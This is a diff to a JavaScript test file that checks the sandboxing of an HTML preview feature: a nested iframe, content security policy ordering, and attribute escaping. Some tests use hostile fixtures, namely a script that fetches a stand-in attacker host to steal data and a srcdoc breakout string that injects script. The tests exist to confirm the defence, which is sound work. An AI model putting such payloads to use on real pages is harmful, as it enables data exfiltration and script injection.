@@ -5,6 +5,7 @@ import {
   HTML_PREVIEW_CDN_HOSTS,
   HTML_PREVIEW_CSP,
   HTML_PREVIEW_MAX_BYTES,
+  HTML_PREVIEW_OUTER_CSP,
   HTML_PREVIEW_SANDBOX,
   buildHtmlPreviewSrcdoc,
   isHtmlPreviewSmallEnough,
@@ -68,26 +69,51 @@ test("script, style, image and font sources are inline or one of three public CD
   assert.ok(!directives["img-src"].some((value) => /^https?:\/\/(?!cdnjs|cdn\.jsdelivr|unpkg)/.test(value)));
 });
 
-test("the policy meta is the first element of the document, ahead of anything the page says", () => {
+const unescape = (value) => value.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
+const split = (srcdoc) => {
+  const match = /^(<!doctype html><meta http-equiv="Content-Security-Policy" content="([^"]*)"><body[^>]*>)<iframe ([^>]*?) srcdoc="([^"]*)"><\/iframe>$/.exec(srcdoc);
+  assert.ok(match, "the preview is one outer document holding one frame: " + srcdoc.slice(0, 200));
+  return { outerPolicy: match[2], frameAttributes: match[3], inner: unescape(match[4]) };
+};
+
+test("the page lives in a frame inside ours, and the outer document allows no frames, so the page cannot navigate itself away", () => {
+  const { outerPolicy, frameAttributes } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
+  assert.equal(outerPolicy, HTML_PREVIEW_OUTER_CSP);
+  assert.equal(HTML_PREVIEW_OUTER_CSP, "frame-src 'none'", "only frame-src: a srcdoc child inherits every directive, so nothing else may be added here");
+  assert.match(frameAttributes, /sandbox="allow-scripts"/);
+  assert.doesNotMatch(frameAttributes, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
+  assert.match(frameAttributes, /referrerpolicy="no-referrer"/);
+});
+
+test("the page's policy meta is the first element of the inner document, ahead of anything the page says", () => {
   const hostile = `<!-- <head> --><script>fetch("https://attacker.example/steal")</script>`;
+  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
+  assert.ok(inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
+  assert.ok(inner.indexOf("Content-Security-Policy") < inner.indexOf("<script>"));
+  assert.ok(inner.endsWith(hostile), "the page is carried exactly as written");
+});
+
+test("a page that tries to close the frame attribute or the outer document stays inside the inner srcdoc", () => {
+  const hostile = '"></iframe><script>alert(1)</script><iframe srcdoc="';
   const srcdoc = buildHtmlPreviewSrcdoc(hostile);
-  assert.ok(srcdoc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
-  assert.ok(srcdoc.indexOf("Content-Security-Policy") < srcdoc.indexOf("<script>"));
-  assert.ok(srcdoc.endsWith(hostile), "the page is carried exactly as written");
+  const { inner } = split(srcdoc);
+  assert.ok(inner.endsWith(hostile));
+  // Every quote of the page is escaped, so the attribute cannot be closed from inside: the only quote-then-tag
+  // sequence left is the real end of the one wrapper frame (split() matched `[^"]*` up to it).
+  assert.equal(srcdoc.split('"><\/iframe>').length - 1, 1);
 });
 
 test("the page's own doctype is replaced by ours so the frame does not fall into quirks mode", () => {
-  const srcdoc = buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>');
-  assert.equal(srcdoc.match(/<!doctype/gi).length, 1);
-  assert.ok(srcdoc.endsWith("<html><body>x</body></html>"));
+  const { inner } = split(buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>'));
+  assert.equal(inner.match(/<!doctype/gi).length, 1);
+  assert.ok(inner.endsWith("<html><body>x</body></html>"));
   // A doctype that is not at the start is the page's content and is left alone.
-  assert.equal(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>").match(/<!doctype/gi).length, 2);
+  assert.equal(split(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>")).inner.match(/<!doctype/gi).length, 2);
 });
 
 test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
   const page = `<meta http-equiv="Content-Security-Policy" content="default-src *"><body>hi</body>`;
-  const srcdoc = buildHtmlPreviewSrcdoc(page);
-  assert.ok(srcdoc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
+  assert.ok(split(buildHtmlPreviewSrcdoc(page)).inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
 });
 
 test("only a ready HTML file within the size limit is previewed", () => {
